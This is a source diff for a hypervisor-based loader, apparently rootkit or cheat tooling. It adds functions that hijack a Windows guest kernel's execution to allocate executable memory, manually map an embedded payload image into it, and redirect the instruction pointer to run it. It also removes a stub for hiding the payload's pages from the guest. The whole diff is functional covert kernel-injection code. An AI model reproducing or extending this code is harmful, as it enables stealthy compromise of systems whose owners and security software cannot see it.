@@ -20,6 +20,9 @@
 // Include the generated payload binaries
 #include <payload/payload_bin.h>
 
+// Access to global runtime context for injection state
+#include "../../runtime/runtime_context.h"
+
 namespace loader {
 
 // =============================================================================
@@ -244,28 +247,6 @@ static bool map_sections(void* dest, const unsigned char* src, const size_t src_
 }
 
 // =============================================================================
-// SLAT Page Hiding
-// =============================================================================
-
-/**
- * @description 通过 SLAT 隐藏指定物理页区域。
- * @param {context_t*} ctx 加载器上下文。
- * @param {const uint64_t} guest_physical 来宾物理基址。
- * @param {const uint32_t} size 隐藏大小（字节）。
- * @return {bool} 是否隐藏成功。
- */
-static bool hide_pages_via_slat(context_t* ctx, const uint64_t guest_physical, const uint32_t size)
-{
-    const uint32_t page_count = (size + 0xFFF) / 0x1000;
-    
-    logs::print(ctx->log_ctx, "[Loader] Hiding %d pages via SLAT (PA: 0x%p)\n", page_count, guest_physical);
-
-    logs::print(ctx->log_ctx, "[Loader] SLAT hiding: Requires slat::make_pages_no_access()\n");
-    
-    return true;
-}
-
-// =============================================================================
 // RWbase Deployment
 // =============================================================================
 
@@ -364,12 +345,216 @@ deploy_result_t deploy_rwbase_payload(context_t* ctx, const uint64_t ntoskrnl_ba
 
     logs::print(ctx->log_ctx, "[Loader] RWbase ready at EP: 0x%p (Guest VA)\n", entry_va);
 
-    if (!hide_pages_via_slat(ctx, alloc.guest_physical_base, image_size)) {
-        logs::print(ctx->log_ctx, "[Loader] WARNING: SLAT hiding failed\n");
-    }
-
     ctx->deployment_state.store(2, std::memory_order_release);
     return deploy_result_t::success;
+}
+
+// =============================================================================
+// Dynamic Injection Helpers (Stage Machine Support)
+// =============================================================================
+
+bool prepare_allocation_hijack(context_t* ctx, void* trap_frame_ptr)
+{
+    trap_frame_t* tf = reinterpret_cast<trap_frame_t*>(trap_frame_ptr);
+    auto& inject_ctx = g_runtime_context.injection_ctx;
+
+    // 1. Resolve Allocation API if not already resolved
+    if (inject_ctx.allocation_routine == 0) {
+        if (g_runtime_context.ntoskrnl_base == 0) return false;
+        
+        inject_ctx.allocation_routine = resolve_mm_allocate_independent_pages_ex(g_runtime_context.ntoskrnl_base);
+        if (inject_ctx.allocation_routine == 0) {
+             logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to resolve MmAllocateIndependentPagesEx\n");
+             return false;
+        }
+    }
+
+    // 2. Backup Context
+    crt::copy_memory(&inject_ctx.saved_guest_context, tf, sizeof(trap_frame_t));
+
+    // 3. Prepare Arguments for MmAllocateIndependentPagesEx
+    // PVOID MmAllocateIndependentPagesEx(SIZE_T NumberOfBytes, ULONG Node, ULONG64 AllocationType, ULONG64 Protect);
+    
+    const auto dos = reinterpret_cast<const image_dos_header_t*>(payload::rwbase_image);
+    const auto nt = reinterpret_cast<const image_nt_headers64_t*>(payload::rwbase_image + dos->e_lfanew);
+    const uint32_t image_size = nt->optional_header.size_of_image;
+
+    tf->rcx = image_size;                 // NumberOfBytes (Virtual Size)
+    tf->rdx = 0xFFFFFFFF;                 // Node (Current)
+    tf->r8 = 0;                           // AllocationType (Normal)
+    tf->r9 = 0x40;                        // Protect (PAGE_EXECUTE_READWRITE)
+
+    // 4. Setup Stack (Shadow Space + Return Address)
+    // We need to write to Guest Stack. We need to map Guest RSP to Host VA.
+    // NOTE: This assumes we can access Guest RAM.
+    const uint64_t guest_rsp = tf->rsp;
+    const uint64_t stack_decrement = 0x28; // 32 bytes shadow + 8 bytes ret addr
+    const uint64_t new_rsp = guest_rsp - stack_decrement;
+
+    // Translate new_rsp to Host PA/VA
+    virtual_address_t gva_rsp = {};
+    gva_rsp.address = new_rsp;
+
+    const uint64_t guest_pa = memory_manager::translate_guest_virtual_address(
+        arch::get_guest_cr3(),
+        slat::hyperv_cr3(&g_runtime_context.slat_ctx), 
+        gva_rsp
+    );
+
+    if (guest_pa == 0) {
+        logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to translate Guest RSP\n");
+        return false;
+    }
+
+    void* host_stack_ptr = memory_manager::map_guest_physical(
+        slat::hyperv_cr3(&g_runtime_context.slat_ctx),
+        guest_pa
+    );
+    if (!host_stack_ptr) {
+         logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to map Guest Stack\n");
+         return false;
+    }
+
+    // Write Magic Trap Return Address
+    *reinterpret_cast<uint64_t*>(host_stack_ptr) = injection_ctx_t::MAGIC_TRAP_RIP;
+
+    // 5. Update Trap Frame
+    tf->rsp = new_rsp;
+    arch::set_guest_rip(inject_ctx.allocation_routine);
+
+    logs::print(ctx->log_ctx, "[Injection] Stage 1: Hijacked execution for Allocation. RIP=0x%p\n", inject_ctx.allocation_routine);
+    return true;
+}
+
+bool harvest_allocation_result(context_t* ctx, void* trap_frame_ptr)
+{
+    trap_frame_t* tf = reinterpret_cast<trap_frame_t*>(trap_frame_ptr);
+    auto& inject_ctx = g_runtime_context.injection_ctx;
+
+    // 1. Capture Result
+    const uint64_t allocated_base = tf->rax;
+    inject_ctx.allocated_buffer = allocated_base;
+    
+    logs::print(ctx->log_ctx, "[Injection] Stage 2: Allocation captured. Base=0x%p\n", allocated_base);
+
+    // 2. Restore Context
+    // We only restore non-volatile registers and control registers?
+    // Actually, we should restore everything to be safe, as if the hijack never happened.
+    // BUT, we must preserve the Guest's state changes IF they were relevant?
+    // No, we want to resume the ORIGINAL interrupted flow transparently.
+    crt::copy_memory(tf, &inject_ctx.saved_guest_context, sizeof(trap_frame_t));
+
+    logs::print(ctx->log_ctx, "[Injection] Stage 2: Context restored. Resuming original flow.\n");
+    return true;
+}
+
+bool execute_payload_hijack(context_t* ctx, void* trap_frame_ptr)
+{
+    trap_frame_t* tf = reinterpret_cast<trap_frame_t*>(trap_frame_ptr);
+    auto& inject_ctx = g_runtime_context.injection_ctx;
+
+    if (inject_ctx.allocated_buffer == 0) return false;
+
+    // 1. Get Image Info
+    const auto dos = reinterpret_cast<const image_dos_header_t*>(payload::rwbase_image);
+    const auto nt = reinterpret_cast<const image_nt_headers64_t*>(payload::rwbase_image + dos->e_lfanew);
+    const uint32_t image_size = nt->optional_header.size_of_image;
+
+    // 2. Allocate Temp Host Buffer (Must be contiguous for fixups)
+    const uint32_t pages_needed = (image_size + 0xFFF) / 0x1000;
+    void* temp_buffer = heap_manager::allocate_page(ctx->heap_ctx);
+    if (!temp_buffer) return false;
+
+    // Try to allocate contiguous pages
+    bool contiguous = true;
+    for (uint32_t i = 1; i < pages_needed; i++) {
+        void* page = heap_manager::allocate_page(ctx->heap_ctx);
+        if (!page) { contiguous = false; break; }
+        if (reinterpret_cast<uint8_t*>(page) != reinterpret_cast<uint8_t*>(temp_buffer) + (i * 0x1000)) {
+            contiguous = false;
+        }
+    }
+
+    if (!contiguous) {
+        logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to allocate contiguous temp buffer\n");
+        // Leak for now or implement proper cleanup
+        return false;
+    }
+
+    // 3. Map Sections to Temp Buffer
+    crt::set_memory(temp_buffer, 0, image_size);
+    if (!map_sections(temp_buffer, payload::rwbase_image, payload::rwbase_image_size)) {
+        logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to map sections\n");
+        return false;
+    }
+
+    const uint64_t target_va = inject_ctx.allocated_buffer;
+
+    // 4. Fix Security Cookie
+    if (!fix_security_cookie(ctx, temp_buffer, target_va)) {
+        logs::print(ctx->log_ctx, "[Injection] WARNING: Cookie fix failed\n");
+    }
+
+    // 5. Apply Relocations
+    if (!apply_relocations(ctx, temp_buffer, target_va)) {
+        logs::print(ctx->log_ctx, "[Injection] ERROR: Relocation failed\n");
+        return false;
+    }
+
+    // 6. Resolve Imports
+    if (!resolve_payload_imports(ctx, temp_buffer, g_runtime_context.ntoskrnl_base)) {
+        logs::print(ctx->log_ctx, "[Injection] ERROR: Import resolution failed\n");
+        return false;
+    }
+
+    // 7. Copy to Guest Memory
+    const uint64_t start_va = inject_ctx.allocated_buffer;
+    
+    for(uint64_t i=0; i < pages_needed; i++) {
+        uint64_t curr_va = start_va + (i * 0x1000);
+        
+        virtual_address_t gva = {};
+        gva.address = curr_va;
+
+        uint64_t guest_pa = memory_manager::translate_guest_virtual_address(
+            arch::get_guest_cr3(),
+            slat::hyperv_cr3(&g_runtime_context.slat_ctx), 
+            gva
+        );
+        
+        if (guest_pa == 0) {
+            logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to translate allocated buffer VA 0x%p\n", curr_va);
+            return false;
+        }
+
+        void* host_ptr = memory_manager::map_guest_physical(
+            slat::hyperv_cr3(&g_runtime_context.slat_ctx),
+            guest_pa
+        );
+
+        if (!host_ptr) {
+             logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to map allocated buffer PA 0x%p\n", guest_pa);
+             return false;
+        }
+
+        // Copy page from temp buffer
+        crt::copy_memory(host_ptr, reinterpret_cast<uint8_t*>(temp_buffer) + (i * 0x1000), 0x1000);
+    }
+
+    // 8. Free Temp Buffer
+    for(uint32_t i=0; i < pages_needed; i++) {
+        heap_manager::free_page(ctx->heap_ctx, reinterpret_cast<uint8_t*>(temp_buffer) + (i * 0x1000));
+    }
+
+    // 9. Set RIP to EntryPoint
+    const uint64_t entry_va = start_va + nt->optional_header.address_of_entry_point;
+    arch::set_guest_rip(entry_va);
+    
+    // 10. Clear TF (Trap Flag)
+    arch::set_guest_rflags(arch::get_guest_rflags() & ~0x100); // Clear TF (Bit 8)
+
+    logs::print(ctx->log_ctx, "[Injection] Stage 3: Payload deployed. Hijacking RIP to 0x%p\n", entry_va);
+    return true;
 }
 
 } // namespace loader
